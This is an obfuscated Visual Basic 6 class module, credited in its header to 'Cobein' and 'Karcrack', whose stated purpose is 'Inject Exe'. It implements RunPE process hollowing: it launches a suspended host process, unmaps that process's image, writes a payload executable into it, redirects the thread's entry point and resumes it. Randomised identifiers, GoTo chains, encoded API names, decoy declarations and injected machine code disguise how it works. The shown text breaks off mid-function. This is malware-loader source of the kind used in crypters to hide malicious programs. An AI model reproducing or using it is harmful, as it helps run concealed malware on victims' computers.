VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "cNtPEL"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Module      : cNtPEL
' DateTime    : 30/06/2009 06:32
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar (updated =D)
' Purpose     : Inject Exe
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Thanks to   : This is gonna be a looong list xD
'               Batfitch - kernel base asm
'               Karcrack - For helping me to debug and test it
'               Paul Caton - vTable patch examples
'               rm_code - First call api prototype
'               and different books and pappers
'
' Compile     : P-Code !!!
'
' Comments    : Coded on top of the invoke module.
'
' History     : 30/06/2009 First Cut....................................................
'               02/08/2009 Modded By Karcrack, Now is NtRunPEL, thanks Slayer (;........
'---------------------------------------------------------------------------------------
Option Explicit

Private Const QLeKzfXQjYq       As Long = &H5A4D&
Private Const A64lKPqh0        As Long = &H4550&

Private Const EiraZ2WoTuXD9PcSD3IkbP0cFvNx4           As Long = &H40
Private Const LYjCgqxV9VzbR8pApyZN6g3L           As Long = &HF8
Private Const W9uCdbJ0SiWzlAHcY1GGyw     As Long = &H28
Private Const SVbGoHTMgUdgWnSCE5cwZdWoefs As Long = &H28

Dim TKJ8Y3zk3tkwKjSNS9v2cUlKe0eT             As String
Dim GZoAUIl3j1RoVwG          As String

Dim SPxHtw1JLEV1xLW6XSs                    As String
Dim GtkDzYrsEKBAqI5HItolyg                    As String

Private Const VwPdogziJ9x0BcV              As Long = &H10007
Private Const RsUOrcmBqr          As Long = &H4
Private Const BnomlJbbytRcaIsjFYWdB9rYzG8B                As Long = &H1000
Private Const KgfP4auzaU62tTlSbj98LOeOSbdk               As Long = &H2000
Private Const BBrUaUbXrgIwRoZNb    As Long = &H40

Private Type T3IgO76WJH1t
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type CVey9oD4g2OESGH97C0bHT34C
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type ZJu76LDAIv8hDw5ByKEzz
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type AakSmfohvn0
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As ZJu76LDAIv8hDw5ByKEzz
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type MJXL2aGhmM
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type PqMj3BDo3iF5P
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type W7hDF5icwZoubAW
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type YwsZ7zWSFXNby
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    Subsystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As W7hDF5icwZoubAW
End Type

Private Type AfW6LKAUW3RV7Ul0
    Signature                   As Long
    FileHeader                  As PqMj3BDo3iF5P
    OptionalHeader              As YwsZ7zWSFXNby
End Type

Private Type Cox2jYJc
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type LzSwKL
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

'Private Declare Sub CpyMem Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)
Private Declare Function s2r2h1hsmFoLuGLITkHI Lib "WINMM.DLL" (ByVal hMixer As Long) As Long 'fake
Private Declare Function R7k2P8CVdTtuswipvNon Lib "gdi32" (ByVal hColorSpace As Long) As Long 'fake
Private Declare Function e3X2n3ytbQkbSfpYYMMm Lib "gdi32" (ByVal hDC As Long) As Long 'fake
Private Declare Sub FSjdPTK8NZMF Lib "kernel32" Alias "RtlMoveMemory" (ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
Private Declare Function t1C6T4qTXlyReREfCAcK Lib "USER32" Alias "LoadCursorFromFileA" (ByVal lpFileName As String) As Long 'fake
Private Declare Function b2R7R5WolJeDurDUiErB Lib "gdi32" (ByVal hMetaFile As Long) As Long 'fake
Private Declare Function k5J2r2RZPuDECHelsXjj Lib "USER32" Alias "LoadCursorA" (ByVal hLib As Long, ByVal lngCursorID As Long) As Long 'fake
Private Declare Function D1v4l5OyTyAOKtHggHQc Lib "gdi32" (ByVal hDC As Long) As Long 'fake

Private F7DgrowJv7u5ptI2sO7gjdF         As Long
Private GIFmi9FECTG      As Long
Private K2ew87MCTuno8iGvS2d1mTRXdtK         As Boolean
Private EEXV90glOPLY1gFs7PGWPE          As Long
Private A5TuYmn9UA       As Long
Private V4oSK010M88OPex8hMG3fYcV(&HFF)   As Byte

       
Public Function Gr4wal2H0UA8wOX5DORzraYg() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
GoTo DxeXfvQUECxBfbnhHZmMci3
DxeXfvQUECxBfbnhHZmMci3:
End Function

Public Function DvN2kUqPS1RGC5XHVRzi77ghD(ByRef bvBuff() As Byte, Optional sHost As String, Optional ByRef hProc As Long) As Boolean
GoTo RZRoOXhr8yZr
RZRoOXhr8yZr:
    Dim i                       As Long
GoTo GDdeSK2T92rH2gDd1v8DZg
GDdeSK2T92rH2gDd1v8DZg:
    Dim QsnAZzDp3OlD7m8kn6I7MdDyCKuq       As MJXL2aGhmM
GoTo XqAbFxaLMmrbZVvx
XqAbFxaLMmrbZVvx:
    Dim DVEZ0XmGFAEDd       As AfW6LKAUW3RV7Ul0
GoTo WGzt9ssLlW
WGzt9ssLlW:
    Dim WXKihzG9mm7Gl6W   As LzSwKL
GoTo FStsf2r3AkSN7MNasDhF
FStsf2r3AkSN7MNasDhF:
    Dim LXktI6JglL            As T3IgO76WJH1t
GoTo HmTlUOfJjJHfEJwoekn6TW6Z7
HmTlUOfJjJHfEJwoekn6TW6Z7:
    Dim H468JuzY8SUtpVG1MLX20cSL7    As CVey9oD4g2OESGH97C0bHT34C
GoTo BA9Vyli10121
BA9Vyli10121:
    Dim A5x89d13E1BgA04mycMlc1OGfZseBA                As AakSmfohvn0
GoTo K1YA4pBOLTx6K
K1YA4pBOLTx6K:
    Dim YlG2FdPVM7sfVwjHIxo0XHy                 As Long
GoTo IJ3Nli
IJ3Nli:
    Dim P4xJQ0BtEEq74NcMuP                  As Long
GoTo SYKvsS
SYKvsS:
    Dim RMdFpm1U9wMAJBpY1b3a67R                    As Long
GoTo HYzQpdh
HYzQpdh:
    If Not K2ew87MCTuno8iGvS2d1mTRXdtK Then Exit Function
GoTo Bl5jbRoUlzMVwz4b
Bl5jbRoUlzMVwz4b:
    Call FSjdPTK8NZMF(QsnAZzDp3OlD7m8kn6I7MdDyCKuq, bvBuff(0), EiraZ2WoTuXD9PcSD3IkbP0cFvNx4)
GoTo I5uoj6i
I5uoj6i:
    If Not QsnAZzDp3OlD7m8kn6I7MdDyCKuq.e_magic = QLeKzfXQjYq Then
GoTo Xad2e0IZmi8MiD1svfhx
Xad2e0IZmi8MiD1svfhx:
        Exit Function
GoTo BzO7atno8muSRNm1
BzO7atno8muSRNm1:
    End If
GoTo Yf6lKjCyY
Yf6lKjCyY:
    Call FSjdPTK8NZMF(DVEZ0XmGFAEDd, bvBuff(QsnAZzDp3OlD7m8kn6I7MdDyCKuq.e_lfanew), LYjCgqxV9VzbR8pApyZN6g3L)
GoTo ExRn94
ExRn94:
    If Not DVEZ0XmGFAEDd.Signature = A64lKPqh0 Then
GoTo UlEAo9C251uJGfg6s31u
UlEAo9C251uJGfg6s31u:
        Exit Function
GoTo MCJ0Lmzwnm
MCJ0Lmzwnm:
    End If
GoTo HGaU5ZhGgDevE8T5H
HGaU5ZhGgDevE8T5H:
GoTo MqnutOBm
MqnutOBm:                                    'kernel32
    YlG2FdPVM7sfVwjHIxo0XHy = FvukZ3yUsm5e82Nf(ROT13("xr{ry@?", True))
GoTo AQHEzM0iq5DE5A
AQHEzM0iq5DE5A:                                    'ntdll
    P4xJQ0BtEEq74NcMuP = FvukZ3yUsm5e82Nf(ROT13("{qyy", True))
GoTo DbHzFHw6uaRfITw2uj53
DbHzFHw6uaRfITw2uj53:
    If sHost = vbNullString Then
GoTo YNjfWu6sAMhQga2dgy
YNjfWu6sAMhQga2dgy:
        sHost = Space(260)
GoTo HWlg8aXhNFg9esb8eGXH
HWlg8aXhNFg9esb8eGXH:                                                'TK779OFwKGowQqex2E2TlTuleFileNameW
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(YlG2FdPVM7sfVwjHIxo0XHy, ROT13("TrZ|q‚yrSvyr[nzrd", True))
GoTo NsHfvLCArXvQ6vXQn
NsHfvLCArXvQ6vXQn:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, App.hInstance, StrPtr(sHost), 260
GoTo Yv1LEzZhN6sDqxpy
Yv1LEzZhN6sDqxpy:
    End If
GoTo DtiaajzXfuQgAnsD
DtiaajzXfuQgAnsD:
    With DVEZ0XmGFAEDd.OptionalHeader
GoTo KgEybIyNhFXbXQAR423uVSok
KgEybIyNhFXbXQAR423uVSok:
        LXktI6JglL.cb = Len(LXktI6JglL)
GoTo FzcOyn8K5wRUamF
FzcOyn8K5wRUamF:
                                                'CreateProcessW
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(YlG2FdPVM7sfVwjHIxo0XHy, ROT13("Prnr]|pr€€d", True))
GoTo UDwBOO8gu
UDwBOO8gu:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, 0, StrPtr(sHost), 0, 0, 0, RsUOrcmBqr, 0, 0, VarPtr(LXktI6JglL), VarPtr(H468JuzY8SUtpVG1MLX20cSL7)
GoTo PjKoBYDN9xMAI7EbzIDP
PjKoBYDN9xMAI7EbzIDP:
                                                'NtUnmapViewOfSection
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[b{zn}cvr„\s`rpv|{", True))
GoTo FI5DjBo5
FI5DjBo5:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hProcess, .ImageBase
GoTo LAnEeBQb3l
LAnEeBQb3l:
                                                'VirtualAllocEx
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(YlG2FdPVM7sfVwjHIxo0XHy, ROT13("cv‚nyNyy|pR…", True))
GoTo POqI0I6rZ7P
POqI0I6rZ7P:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hProcess, .ImageBase, .SizeOfImage, BnomlJbbytRcaIsjFYWdB9rYzG8B Or KgfP4auzaU62tTlSbj98LOeOSbdk, BBrUaUbXrgIwRoZNb
GoTo GHswW7FK99n6
GHswW7FK99n6:
                                                'NtWriteVirtualMemory
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[dvrcv‚nyZrz|†", True))
GoTo PBn1UMvrdEc6Dp
PBn1UMvrdEc6Dp:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
GoTo E2tZqDxvNAkmE
E2tZqDxvNAkmE:
        For i = 0 To DVEZ0XmGFAEDd.FileHeader.NumberOfSections - 1
GoTo CezC802
CezC802:
            FSjdPTK8NZMF WXKihzG9mm7Gl6W, bvBuff(QsnAZzDp3OlD7m8kn6I7MdDyCKuq.e_lfanew + LYjCgqxV9VzbR8pApyZN6g3L + SVbGoHTMgUdgWnSCE5cwZdWoefs * i), Len(WXKihzG9mm7Gl6W)
GoTo REk5I6n7lAQ0A6PqQFZr
REk5I6n7lAQ0A6PqQFZr:
            XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hProcess, .ImageBase + WXKihzG9mm7Gl6W.VirtualAddress, VarPtr(bvBuff(WXKihzG9mm7Gl6W.PointerToRawData)), WXKihzG9mm7Gl6W.SizeOfRawData, 0
GoTo LHD0puRFXl
LHD0puRFXl:
        Next i
GoTo ZZHYzctlaRo7OhMkqWR2ZktZ
ZZHYzctlaRo7OhMkqWR2ZktZ:
        A5x89d13E1BgA04mycMlc1OGfZseBA.ContextFlags = VwPdogziJ9x0BcV
GoTo CYK0Mrc
CYK0Mrc:
                                                'NtGeA5x89d13E1BgA04mycMlc1OGfZseBAThread
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[TrP|{r…aurnq", True))
GoTo CzGkdKqWxcUD9Q8NfEoC
CzGkdKqWxcUD9Q8NfEoC:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hThread, VarPtr(A5x89d13E1BgA04mycMlc1OGfZseBA)
GoTo TIdwG44g8NfdKvpt
TIdwG44g8NfdKvpt:
                                                'NtWriteVirtualMemory
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[dvrcv‚nyZrz|†", True))
GoTo CxNakMrJF2XQm6c
CxNakMrJF2XQm6c:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hProcess, A5x89d13E1BgA04mycMlc1OGfZseBA.Ebx + 8, VarPtr(.ImageBase), 4, 0
GoTo P0TdRIP
P0TdRIP:
        A5x89d13E1BgA04mycMlc1OGfZseBA.Eax = .ImageBase + .AddressOfEntryPoint
GoTo Qx3RvPPXO3eWYNPHQ
Qx3RvPPXO3eWYNPHQ:
                                                'NtSeA5x89d13E1BgA04mycMlc1OGfZseBAThread
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[`rP|{r…aurnq", True))
GoTo GiLVmtHg
GiLVmtHg:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hThread, VarPtr(A5x89d13E1BgA04mycMlc1OGfZseBA)
GoTo SvYobkA15DFb9s
SvYobkA15DFb9s:
       
                                                'NtResumeThread
        RMdFpm1U9wMAJBpY1b3a67R = FNyHnwZwmJoUaokcf(P4xJQ0BtEEq74NcMuP, ROT13("[_r€‚zraurnq", True))
GoTo ZDRlH1vx3wfTTv9yRutuPz
ZDRlH1vx3wfTTv9yRutuPz:
        XV9KObBX RMdFpm1U9wMAJBpY1b3a67R, H468JuzY8SUtpVG1MLX20cSL7.hThread, 0
GoTo DUbpND
DUbpND:
        hProc = H468JuzY8SUtpVG1MLX20cSL7.hProcess
GoTo DRUCyhIISCEXrud
DRUCyhIISCEXrud:
    End With
GoTo CCnQS6bidcCkQqsslsvcC
CCnQS6bidcCkQqsslsvcC:
    DvN2kUqPS1RGC5XHVRzi77ghD = True
GoTo ZWphB9tzDdyGv5ARPmoUcUz
ZWphB9tzDdyGv5ARPmoUcUz:
End Function

Public Function XV9KObBX(ByVal RMdFpm1U9wMAJBpY1b3a67R As Long, ParamArray Params()) As Long
GoTo RgXQYDgrm5iAxe1VYG8Tr
RgXQYDgrm5iAxe1VYG8Tr:
    Dim lPtr        As Long
GoTo TLHLzLLJtJWgDH7h3SmT
TLHLzLLJtJWgDH7h3SmT:
    Dim i           As Long
GoTo SCWUA9AKd7OWeRS
SCWUA9AKd7OWeRS:
    Dim sData       As String
GoTo PFpdFMLp
PFpdFMLp:
    Dim sParams     As String
GoTo Izt8H7rJeVbkhdcg8i
Izt8H7rJeVbkhdcg8i:
    If RMdFpm1U9wMAJBpY1b3a67R = 0 Then Exit Function
GoTo W80O0ln9SJeLtK0RLw
W80O0ln9SJeLtK0RLw:
    For i = UBound(Params) To 0 Step -1
GoTo McOEUstHtBeCpa9pqBdm
McOEUstHtBeCpa9pqBdm:
        sParams = sParams & ROT13("CE", True) & HQIjGH(CLng(Params(i)))
GoTo OULzh7sTEgo
OULzh7sTEgo:
    Next
GoTo WZxP8w4iZrp30Ptw
WZxP8w4iZrp30Ptw:
    lPtr = VarPtr(V4oSK010M88OPex8hMG3fYcV(0))
GoTo Ni9uM1TXy1Gxao7x6sO3N
Ni9uM1TXy1Gxao7x6sO3N:
    lPtr = lPtr + (UBound(Params) + 2) * 5
GoTo ZeZ9a9Z
ZeZ9a9Z:
    lPtr = RMdFpm1U9wMAJBpY1b3a67R - lPtr - 5
GoTo VC8LbQiFNzV
VC8LbQiFNzV:
    sData = TKJ8Y3zk3tkwKjSNS9v2cUlKe0eT
GoTo X6SQ5L3tBu7f8NwjgsFfVfIax
X6SQ5L3tBu7f8NwjgsFfVfIax:
    sData = Replace(sData, SPxHtw1JLEV1xLW6XSs, sParams)
GoTo IAggxW8
IAggxW8:
    sData = Replace(sData, GtkDzYrsEKBAqI5HItolyg, HQIjGH(lPtr))
GoTo NKL8u5JlfACrLTRxtWUQn
NKL8u5JlfACrLTRxtWUQn:
    Call JlzoFwndM74iibA24lHAdV2CtvS9(sData)
GoTo DcThVnBzdeCVg3
DcThVnBzdeCVg3:
    XV9KObBX = AO3ZuwdMG1IyldGvmKFykH0
GoTo BNE9PHegb
BNE9PHegb:
End Function

Private Function HQIjGH(ByVal lData As Long) As String
GoTo MyFGfM2O8fDq1M
MyFGfM2O8fDq1M:
    Dim bvTemp(3)   As Byte
GoTo HBkL8i0FZ3CDH
HBkL8i0FZ3CDH:
    Dim i           As Long
GoTo Yain09r0cpW939x1GKEtkvbhy
Yain09r0cpW939x1GKEtkvbhy:
    FSjdPTK8NZMF bvTemp(0), lData, &H4
GoTo CT0OZRDjvWv2sIvJSYPFf2
CT0OZRDjvWv2sIvJSYPFf2:
    For i = 0 To 3
GoTo Dqf23WnIZOD
Dqf23WnIZOD:
        HQIjGH = HQIjGH & Right(ROT13("=", True) & Hex(bvTemp(i)), 2)
GoTo PsOgfp
PsOgfp:
    Next
GoTo JM3ftTh275IA9
JM3ftTh275IA9:
End Function

Private Sub JlzoFwndM74iibA24lHAdV2CtvS9(ByVal sThunk As String)
GoTo OrJbGObJZN6jpEsgO
OrJbGObJZN6jpEsgO:
    Dim i   As Long
GoTo MOllMufpw06hACGGZpvm
MOllMufpw06hACGGZpvm:
    For i = 0 To Len(sThunk) - 1 Step 2
GoTo KdllVEi2eDk9nT3B7bhUk
KdllVEi2eDk9nT3B7bhUk:
        V4oSK010M88OPex8hMG3fYcV((i / 2)) = CByte(ROT13("3u", True) & Mid$(sThunk, i + 1, 2))
GoTo Z6nX3e7ypTXEfEhkT1p3bgz
Z6nX3e7ypTXEfEhkT1p3bgz:
    Next i
GoTo HBYrdKf7
HBYrdKf7:
End Sub

Private Function AO3ZuwdMG1IyldGvmKFykH0() As Long
GoTo T5wo50odZw21T
T5wo50odZw21T:
    FSjdPTK8NZMF EEXV90glOPLY1gFs7PGWPE, ByVal ObjPtr(Me), &H4
GoTo S8zxsN3mj78n70gmS
S8zxsN3mj78n70gmS:
    EEXV90glOPLY1gFs7PGWPE = EEXV90glOPLY1gFs7PGWPE + &H1C
GoTo TbUvGRohut
TbUvGRohut:
    FSjdPTK8NZMF A5TuYmn9UA, ByVal EEXV90glOPLY1gFs7PGWPE, &H4
GoTo M9VTw44BtJOM
M9VTw44BtJOM:
    FSjdPTK8NZMF ByVal EEXV90glOPLY1gFs7PGWPE, VarPtr(V4oSK010M88OPex8hMG3fYcV(0)), &H4
GoTo M2aowm
M2aowm:
    AO3ZuwdMG1IyldGvmKFykH0 = Gr4wal2H0UA8wOX5DORzraYg
GoTo Mlf4UXvoxM
Mlf4UXvoxM:
    FSjdPTK8NZMF ByVal EEXV90glOPLY1gFs7PGWPE, A5TuYmn9UA, &H4
GoTo C2M78yf5qGtRqC
C2M78yf5qGtRqC:
End Function

Public Function TK779OFwKGowQqex2E2TlT(ByVal sLib As String, ByVal sProc As String) As Long
GoTo CcEavuMWN1tWoYszOD3IEc
CcEavuMWN1tWoYszOD3IEc:
    TK779OFwKGowQqex2E2TlT = Me.FNyHnwZwmJoUaokcf(Me.FvukZ3yUsm5e82Nf(sLib), sProc)
GoTo Z5wT5CxcIz
Z5wT5CxcIz:
End Function

Public Function FvukZ3yUsm5e82Nf(ByVal sLib As String) As Long
GoTo JNr0jBQWjl6U5GERUaxVoBiwj
JNr0jBQWjl6U5GERUaxVoBiwj:
    FvukZ3yUsm5e82Nf = XV9KObBX(GIFmi9FECTG, StrPtr(sLib & vbNullChar))
GoTo Ybmr3ZPaCIuGpg9ehH2FLGY
Ybmr3ZPaCIuGpg9ehH2FLGY:
End Function

Public Property Get Initialized() As Boolean
GoTo HSqMi8sLjRA5vtzJPA7
HSqMi8sLjRA5vtzJPA7:
    Initialized = K2ew87MCTuno8iGvS2d1mTRXdtK
GoTo Az4kdA
Az4kdA:
End Property

Public Sub Class_Initialize()
GoTo WPaxb3SAikVu4DpwEETCAXW
WPaxb3SAikVu4DpwEETCAXW:
SPxHtw1JLEV1xLW6XSs = ROT13("Ie†EYQA\E^>†[‡oeBrweK", True)
GoTo M8qKUuuCryIYX1HcdBe3xcN2m
M8qKUuuCryIYX1HcdBe3xcN2m:
GtkDzYrsEKBAqI5HItolyg = ROT13("IW|b{cad‡`XE}@aE~R`€wK", True)
GoTo CxJBP4IWovqklTB0NmCUc
CxJBP4IWovqklTB0NmCUc:
GZoAUIl3j1RoVwG = ROT13("EOAP?A=EBCBB@>P=CAEOD=@=EODC=PEODC>PEOCR=EEODR?=EO@C@EAD>EDBS@E=@SCODA=DE=@SAODA=?RORDEF?FBQBRP@", True)
GoTo DMzIyWnAhhduycl4DxpuhgQ4d
DMzIyWnAhhduycl4DxpuhgQ4d:
TKJ8Y3zk3tkwKjSNS9v2cUlKe0eT = ROT13("EOAP?A=EB>Ie†EYQA\E^>†[‡oeBrweKREIW|b{cad‡`XE}@aE~R`€wKBFEF=>CC@>P=P@", True)
GoTo C4xsngzK0Y59Tdiy6kfWVa9C
C4xsngzK0Y59Tdiy6kfWVa9C:

    Call JlzoFwndM74iibA24lHAdV2CtvS9(GZoAUIl3j1RoVwG)
GoTo KaatSu5CRfzEQkv7qPRK
KaatSu5CRfzEQkv7qPRK:
    F7DgrowJv7u5ptI2sO7gjdF = AO3ZuwdMG1IyldGvmKFykH0
GoTo Qz2kWFqteKO1AOcRq
Qz2kWFqteKO1AOcRq:
    If Not F7DgrowJv7u5ptI2sO7gjdF = 0 Then
GoTo CHEOboleUNj95e4q00lg5N7VC
CHEOboleUNj95e4q00lg5N7VC:
        GIFmi9FECTG = FNyHnwZwmJoUaokcf(F7DgrowJv7u5ptI2sO7gjdF, ROT13("Y|nqYvon†d", True))
GoTo F3lP7HL9hQbehBBUf
F3lP7HL9hQbehBBUf:
        If Not GIFmi9FECTG = 0 Then
GoTo XEeVofXWypE3jjKeYhM2Jx
XEeVofXWypE3jjKeYhM2Jx:
            K2ew87MCTuno8iGvS2d1mTRXdtK = True
GoTo K4firSgIMUJdyz3yYihk
K4firSgIMUJdyz3yYihk:
        End If
GoTo L27C5Uq2uKeyGyjl0hx8zl
L27C5Uq2uKeyGyjl0hx8zl:
    End If
GoTo Ht5f6Bu9tEjAhXyCa7
Ht5f6Bu9tEjAhXyCa7:
End Sub

Public Function FNyHnwZwmJoUaokcf(ByVal RMdFpm1U9wMAJBpY1b3a67R As Long, ByVal sProc As String) As Long
GoTo LFGPPOtgL
LFGPPOtgL:
    Dim QsnAZzDp3OlD7m8kn6I7MdDyCKuq       As MJXL2aGhmM
GoTo JuDTYS9
JuDTYS9:
    Dim DVEZ0XmGFAEDd       As AfW6LKAUW3RV7Ul0
GoTo I0g31FqEgu8
I0g31FqEgu8:
    Dim tCox2jYJc As Cox2jYJc
GoTo FKXp4Df
FKXp4Df:
    Call FSjdPTK8NZMF(QsnAZzDp3OlD7m8kn6I7MdDyCKuq, ByVal RMdFpm1U9wMAJBpY1b3a67R, EiraZ2WoTuXD9PcSD3IkbP0cFvNx4)
GoTo Lg9Ypm0kB66W1PxnoKYHp9l
Lg9Ypm0kB66W1PxnoKYHp9l:
    If Not QsnAZzDp3OlD7m8kn6I7MdDyCKuq.e_magic = QLeKzfXQjYq Then
GoTo VmRM35KUYBV
VmRM35KUYBV:
        Exit Function
GoTo SRetRAJbVikKUS
SRetRAJbVikKUS:
    End If
GoTo RqGxirLZUr
RqGxirLZUr:
    Call FSjdPTK8NZMF(DVEZ0XmGFAEDd, ByVal RMdFpm1U9wMAJBpY1b3a67R + QsnAZzDp3OlD7m8kn6I7MdDyCKuq.e_lfanew, LYjCgqxV9VzbR8pApyZN6g3L)
GoTo YxMRcDjBzXZR9Upc1y
YxMRcDjBzXZR9Upc1y:
    If Not DVEZ0XmGFAEDd.Signature = A64lKPqh0 Then
GoTo TKx79SU1DBsW25MgwT
TKx79SU1DBsW25MgwT:
        Exit Function
GoTo SaPp56KrqXIRtHeqRXMWHoS
SaPp56KrqXIRtHeqRXMWHoS:
    End If
GoTo CJh1Ya2
CJh1Ya2:
    Dim lVAddress   As Long
GoTo Tt1jxB48MF6UECy2JwtyfjHt
Tt1jxB48MF6UECy2JwtyfjHt:
    Dim lVSize      As Long
GoTo TGQ7RUfr7xyzhXaUYAP4t
TGQ7RUfr7xyzhXaUYAP4t:
    Dim lBase       As Long
GoTo KE7aHbPqKCbVrM4ZdNBr1k
KE7aHbPqKCbVrM4ZdNBr1k:
   
    With DVEZ0XmGFAEDd.OptionalHeader
GoTo H5L1aFaEIOesCQZJXh6qh
H5L1aFaEIOesCQZJXh6qh:
        lVAddress = RMdFpm1U9wMAJBpY1b3a67R + .DataDirectory(0).VirtualAddress
GoTo WAQxcG76jRFzSOGcpqY6W
WAQxcG76jRFzSOGcpqY6W:
        lVSize = lVAddress + .DataDirectory(0).Size
GoTo PnLeWQOuqY5r4p
PnLeWQOuqY5r4p:
        lBase = .ImageBase
GoTo Jl7gG9
Jl7gG9:
    End With
GoTo HdoQqoQQdJVkH
HdoQqoQQdJVkH:
    Call FSjdPTK8NZMF(tCox2jYJc, ByVal lVAddress, W9uCdbJ0SiWzlAHcY1GGyw)
GoTo D01Pp5Dovy6eC3
D01Pp5Dovy6eC3:
    Dim i           As Long
GoTo BasuVK0gsOWDMqaySswr72B
BasuVK0gsOWDMqaySswr72B:
    Dim lFunctAdd   As Long
GoTo FkCnPmmM1HVkNpCp0en0f
FkCnPmmM1HVkNpCp0en0f:
    Dim lNameAdd    As Long
